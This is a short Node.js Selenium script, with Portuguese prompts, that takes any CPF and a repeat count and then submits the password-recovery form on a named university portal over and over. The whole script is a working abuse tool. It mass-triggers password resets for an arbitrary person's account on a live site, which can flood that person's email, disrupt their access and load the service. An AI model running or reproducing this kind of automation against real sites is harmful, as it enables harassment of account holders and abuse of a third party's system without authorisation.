const { Builder, By, Key, until } = require('selenium-webdriver');
const readline = require('readline-sync');

async function abrirSiteComAutomacao(driver, cpf) {
    await driver.get('https://saga2.faccat.br/index.php?op=1068');

    try {
        let inputs = await driver.wait(until.elementsLocated(By.name('login')), 10000);
        let textInput = inputs[1];
        await textInput.sendKeys(cpf);

        let confirmarButton = await driver.findElement(By.id('botao_recuperar_senha'));
        await confirmarButton.click();

        await driver.sleep(1000);
    } catch (error) {
        console.error(`Erro ao processar CPF ${cpf}:`, error);
    }
}

async function executarAutomacao(driver, cpf, quantidadeVezes) {
    for (let i = 0; i < quantidadeVezes; i ++) {
        await abrirSiteComAutomacao(driver, cpf);
    }
}

async function main() {
    const cpf = readline.question("Informe o cpf a ser testado: ");
    const quantidadeVezes = readline.question("Informe o total de vezes que a senha deve ser resetada: ");

    let driver = await new Builder().forBrowser('chrome').build();

    try {
        await executarAutomacao(driver, cpf, quantidadeVezes);
    } finally {
        await driver.quit();
    }
}

main().catch(console.error);
